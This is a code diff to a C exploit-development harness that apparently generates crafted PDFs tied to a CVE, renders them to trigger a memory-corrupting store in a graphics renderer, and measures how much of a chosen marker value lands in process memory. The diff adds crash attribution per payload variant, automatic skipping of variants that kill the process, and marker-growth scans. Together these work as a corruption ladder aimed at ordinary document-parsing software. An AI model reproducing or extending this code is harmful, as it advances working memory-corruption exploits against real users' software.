@@ -744,6 +744,36 @@ static int cg_state_read(const char *leaf) {
     return v;
 }
 
+// Same read, but a missing file answers -1 instead of 0. The lane registry
+// needs that distinction: "no lane has ever run" and "lane 0 was running when
+// the process died" must not collapse into the same value.
+static int cg_state_read_missing(const char *leaf) {
+    char path[1024];
+    cg_state_path(path, sizeof(path), leaf);
+    FILE *f = fopen(path, "rb");
+    if (!f) return -1;
+    int v = -1;
+    if (fscanf(f, "%d", &v) != 1) v = -1;
+    fclose(f);
+    return v;
+}
+
+// Reads the signal number out of fatal.txt ("sig=6 lane=1"). Answers 0 when the
+// file is absent or unparsable, which is the honest answer for "we never got a
+// fatal signal we could trap" — a SIGKILL or a watchdog leaves nothing.
+static int cg_sig_read(void) {
+    char path[1024];
+    cg_state_path(path, sizeof(path), "fatal.txt");
+    FILE *f = fopen(path, "rb");
+    if (!f) return 0;
+    char buf[64] = {0};
+    if (!fgets(buf, sizeof(buf), f)) buf[0] = 0;
+    fclose(f);
+    int sig = 0;
+    if (sscanf(buf, "sig=%d", &sig) != 1) return 0;
+    return sig;
+}
+
 static void cg_state_write(const char *leaf, int v) {
     char path[1024];
     cg_state_path(path, sizeof(path), leaf);
@@ -761,15 +791,25 @@ static void cg_state_write(const char *leaf, int v) {
 // not a SIGSEGV, so the render handler never sees it. Trap it, leave a marker
 // next to the log, then re-raise with the default action so the system still
 // writes an .ips entry naming this frame.
-static char g_abort_path[1024] = {0};
-static volatile sig_atomic_t g_abort_armed = 0;
+//
+// The same trap carries SIGILL/SIGTRAP/SIGSYS/SIGFPE, because a quiet heap
+// corruption surfaces as any of those and every one of them is invisible to a
+// SIGSEGV-only harness. The lane index is baked into the marker so a death is
+// attributable even when the log stops mid-line.
+static char g_fatal_path[1024] = {0};
+static volatile sig_atomic_t g_fatal_armed = 0;
+static volatile sig_atomic_t g_cur_lane = -1;
 
-static void cg_abort_trap(int sig) {
-    if (g_abort_armed && g_abort_path[0]) {
-        int fd = open(g_abort_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+static void cg_fatal_trap(int sig) {
+    if (g_fatal_armed && g_fatal_path[0]) {
+        int fd = open(g_fatal_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
         if (fd >= 0) {
-            ssize_t w = write(fd, "abort\n", 6);
-            (void)w;
+            char b[64];
+            int n = snprintf(b, sizeof(b), "sig=%d lane=%d\n", sig, (int)g_cur_lane);
+            if (n > 0) {
+                ssize_t w = write(fd, b, (size_t)n);
+                (void)w;
+            }
             fsync(fd);
             close(fd);
         }
@@ -778,11 +818,15 @@ static void cg_abort_trap(int sig) {
     raise(sig);
 }
 
-static void cg_abort_arm(void) {
-    cg_state_path(g_abort_path, sizeof(g_abort_path), "abort.txt");
-    unlink(g_abort_path);
-    g_abort_armed = 1;
-    signal(SIGABRT, cg_abort_trap);
+static void cg_fatal_arm(void) {
+    cg_state_path(g_fatal_path, sizeof(g_fatal_path), "fatal.txt");
+    unlink(g_fatal_path);
+    g_fatal_armed = 1;
+    signal(SIGABRT, cg_fatal_trap);
+    signal(SIGILL,  cg_fatal_trap);
+    signal(SIGTRAP, cg_fatal_trap);
+    signal(SIGSYS,  cg_fatal_trap);
+    signal(SIGFPE,  cg_fatal_trap);
 }
 
 // ---------------------------------------------------------------------------
@@ -794,7 +838,8 @@ static void cg_abort_arm(void) {
 // emit. A run means a silent store happened; its address says where.
 // ---------------------------------------------------------------------------
 
-static int cg_tag_scan(const cgvar *v, uint64_t tag, uint64_t budget) {
+static int cg_tag_scan(const cgvar *v, uint64_t tag, uint64_t budget,
+                       size_t *outLargest, uint64_t *outWords) {
     cg_vr_fn_t fn = cg_region_fn(NULL);
     if (!fn) { cg_logf("[TAG] %s no region call", v->name); return 0; }
 
@@ -803,6 +848,9 @@ static int cg_tag_scan(const cgvar *v, uint64_t tag, uint64_t budget) {
 
     uint64_t scanned = 0;
     uint64_t runs = 0;
+    uint64_t words = 0;
+    size_t largest = 0;
+    uintptr_t largestAt = 0;
     int printed = 0;
     vm_address_t addr = 0;
 
@@ -854,6 +902,11 @@ static int cg_tag_scan(const cgvar *v, uint64_t tag, uint64_t budget) {
                         // the count against the pre-render baseline.
                         if (run >= (size_t)14) {
                             runs++;
+                            words += run;
+                            if (run > largest) {
+                                largest = run;
+                                largestAt = (uintptr_t)(region + off + o);
+                            }
                             if (printed < 8) {
                                 printed++;
                                 cg_logf("[TAG] %s run=%zu at=0x%llx",
@@ -872,8 +925,15 @@ static int cg_tag_scan(const cgvar *v, uint64_t tag, uint64_t budget) {
     }
 
     free(buf);
-    cg_logf("[TAG] %s scanned=0x%llx markerRuns=%llu", v->name,
-            (unsigned long long)scanned, (unsigned long long)runs);
+    // words and largest matter more than runs. The burst writes contiguously,
+    // so a lane can double the size of an existing run without adding a single
+    // new one — exactly what happened on build-35, where the marker count went
+    // 1 -> 1 and 16 KB of our value still landed.
+    if (outLargest) *outLargest = largest;
+    if (outWords) *outWords = words;
+    cg_logf("[TAG] %s scanned=0x%llx markerRuns=%llu words=%llu largest=%zu at=0x%llx",
+            v->name, (unsigned long long)scanned, (unsigned long long)runs,
+            (unsigned long long)words, largest, (unsigned long long)largestAt);
     return (int)runs;
 }
 
@@ -956,7 +1016,7 @@ void cg_section(void (*logcb)(const char *)) {
     int win = -1;
     char winName[32] = "none";
 
-    cg_abort_arm();
+    cg_fatal_arm();
 
     // ---- CG-1: trigger sweep ----
     int sweepStart = cg_state_read("cg-sweep.txt");
@@ -1204,25 +1264,63 @@ void cg_tail_section(void (*logcb)(const char *)) {
         return;
     }
     int haveBus = (sigaction(SIGBUS, &sa, &oldbus) == 0);
-    cg_abort_arm();
+    cg_fatal_arm();
 
     const char *home = getenv("HOME");
     if (!home || !*home) home = "/tmp";
     char path[1024];
     snprintf(path, sizeof(path), "%s/Documents/cve_2026_112611.pdf", home);
 
-    int start = cg_state_read("cg-tail.txt");
+    // Two files. cg-lane.txt is the lane to run next and only advances after a
+    // lane returns; cg-lane-cur.txt names the lane that is running right now.
+    // When the two agree on entry, the previous launch died inside that lane —
+    // it gets named in this log and the ladder steps over it instead of
+    // re-running the same poison forever.
+    int start = cg_state_read("cg-lane.txt");
     if (start < 0) start = 0;
     if (start > CG_NVARS) start = CG_NVARS;
+    int cur = cg_state_read_missing("cg-lane-cur.txt");
+
     cg_logf("[CGK] resume=%d laneValue=0x%llx", start,
             (unsigned long long)CG_REDIR_C0);
-    if (start > 0)
-        cg_logf("[CGK] an earlier launch stopped before lane index %d", start);
+
+    char killer[32] = {0};
+    int killed = 0;
+    if (cur >= 0 && cur == start) {
+        killed = 1;
+        int k = 0;
+        int kvpr = 0, krows = 0, kc0 = 0;
+        for (int i = 0; i < CG_NVARS; i++) {
+            if (strncmp(g_cg_vars[i].name, "K_", 2) != 0) continue;
+            if (k == cur) {
+                snprintf(killer, sizeof(killer), "%s", g_cg_vars[i].name);
+                kvpr = g_cg_vars[i].vpr;
+                krows = g_cg_vars[i].rows;
+                kc0 = g_cg_vars[i].c0count;
+                break;
+            }
+            k++;
+        }
+        int sig = cg_sig_read();
+        uint64_t b = (uint64_t)kvpr * (uint64_t)krows * (uint64_t)kc0 * 8ull;
+        cg_logf("[CGK] * KILLER lane=%d %s — the previous launch died inside it",
+                cur, killer[0] ? killer : "?");
+        cg_logf("[CGK] * last fatal signal=%d (0 = none recorded, see fatal.txt)", sig);
+        cg_logf("[CGK] * burst it attempted: %d verts x %d operands x 8 = %llu bytes",
+                kvpr * krows, kc0, (unsigned long long)b);
+        start = cur + 1;
+        cg_state_write("cg-lane.txt", start);
+        cg_logf("[CGK] stepping over lane=%d, resuming at %d", cur, start);
+    }
 
     int ran = 0, faulted = 0, grew = 0;
     int lane = 0;
-    int baseRuns = cg_tag_scan(&g_cg_vars[0], CG_REDIR_C0, 96ull << 20);
-    cg_logf("[CGK] tag baseline runs=%d (before any lane)", baseRuns);
+    size_t baseLargest = 0;
+    uint64_t baseWords = 0;
+    int baseRuns = cg_tag_scan(&g_cg_vars[0], CG_REDIR_C0, 96ull << 20,
+                               &baseLargest, &baseWords);
+    cg_logf("[CGK] tag baseline runs=%d words=%llu largest=%zu (before any lane)",
+            baseRuns, (unsigned long long)baseWords, baseLargest);
 
     for (int i = 0; i < CG_NVARS; i++) {
         const cgvar *v = &g_cg_vars[i];
@@ -1231,9 +1329,14 @@ void cg_tail_section(void (*logcb)(const char *)) {
 
         if (myLane < start) continue;
 
-        cg_state_write("cg-tail.txt", myLane + 1);
-        cg_logf("[CGK] running lane=%d %s vpr=%d rows=%d verts=%d c0=%d",
-                myLane, v->name, v->vpr, v->rows, v->vpr * v->rows, v->c0count);
+        uint64_t burst = (uint64_t)v->vpr * (uint64_t)v->rows *
+                         (uint64_t)v->c0count * 8ull;
+
+        g_cur_lane = myLane;
+        cg_state_write("cg-lane-cur.txt", myLane);
+        cg_logf("[CGK] running lane=%d %s vpr=%d rows=%d verts=%d c0=%d burst=%llu",
+                myLane, v->name, v->vpr, v->rows, v->vpr * v->rows,
+                v->c0count, (unsigned long long)burst);
 
         char err[128] = {0};
         size_t len = 0;
@@ -1241,14 +1344,24 @@ void cg_tail_section(void (*logcb)(const char *)) {
                                     err, sizeof(err));
         if (!pdf) {
             cg_logf("[CGK] %s build FAILED: %s", v->name, err);
+            cg_state_write("cg-lane.txt", myLane + 1);
+            g_cur_lane = -1;
             continue;
         }
         if (cg_write_file(pdf, len, path) != 0) {
             cg_logf("[CGK] %s write FAILED", v->name);
             free(pdf);
+            cg_state_write("cg-lane.txt", myLane + 1);
+            g_cur_lane = -1;
             continue;
         }
         free(pdf);
+
+        // Last line before the store that can corrupt this process. Everything
+        // after it may never run, so the lane index is already on disk under
+        // cg-lane-cur.txt and the name is the one printed above.
+        cg_logf("[CGK] %s render enter (burst=%llu bytes)",
+                v->name, (unsigned long long)burst);
 
         cg_hit = 0; cg_far = 0; cg_pc = 0; cg_insn = 0; cg_wnr = -1;
         cg_recursive = 0;
@@ -1262,6 +1375,12 @@ void cg_tail_section(void (*logcb)(const char *)) {
                 (unsigned long long)cg_far, (int)cg_wnr, (unsigned)cg_insn,
                 (int)cg_recursive, err[0] ? err : "-");
 
+        // The lane returned, so the process survived it. Advance the durable
+        // cursor before any further work can take it down.
+        cg_state_write("cg-lane.txt", myLane + 1);
+        cg_state_write("cg-lane-cur.txt", -1);
+        g_cur_lane = -1;
+
         if (cg_hit > 0) {
             faulted++;
             cg_tail_scan(cg_far, CG_REDIR_C0);
@@ -1269,19 +1388,29 @@ void cg_tail_section(void (*logcb)(const char *)) {
         }
 
         // No fault. Either the shading was rejected before it ran, or the store
-        // landed in mapped memory. The tag count says whether the marker now
-        // sits in more places than before the render; it is a hint, not a
-        // verdict, because a successful render also leaves markers behind.
-        int runs = cg_tag_scan(v, CG_REDIR_C0, 96ull << 20);
-        if (runs > baseRuns) {
+        // landed in mapped memory. Compare against the baseline on every axis:
+        // the burst writes contiguously, so a lane that extends an existing run
+        // by 16 KB leaves markerRuns at 1 and only moves `words` and `largest`.
+        size_t largest = 0;
+        uint64_t words = 0;
+        int runs = cg_tag_scan(v, CG_REDIR_C0, 96ull << 20, &largest, &words);
+        if (runs > baseRuns || words > baseWords) {
             grew++;
-            cg_logf("[CGK] %s marker count rose %d -> %d after a no-fault render",
-                    v->name, baseRuns, runs);
+            cg_logf("[CGK] %s marker grew after a no-fault render: runs %d->%d words %llu->%llu largest %zu->%zu (+%llu bytes)",
+                    v->name, baseRuns, runs, (unsigned long long)baseWords,
+                    (unsigned long long)words, baseLargest, largest,
+                    (unsigned long long)((words > baseWords ? words - baseWords : 0) * 8ull));
+        } else {
+            cg_logf("[CGK] %s no marker growth — that geometry did not reach the store",
+                    v->name);
         }
     }
 
-    cg_state_write("cg-tail.txt", lane);
-    cg_logf("[CGK] lanes=%d faulted=%d markerGrew=%d", ran, faulted, grew);
+    g_cur_lane = -1;
+    cg_state_write("cg-lane-cur.txt", -1);
+    cg_state_write("cg-lane.txt", lane);
+    cg_logf("[CGK] lanes=%d faulted=%d markerGrew=%d killedLastLaunch=%d",
+            ran, faulted, grew, killed);
     sigaction(SIGSEGV, &oldsegv, NULL);
     if (haveBus) sigaction(SIGBUS, &oldbus, NULL);
     cg_logf("[CGK] === ladder done ===");
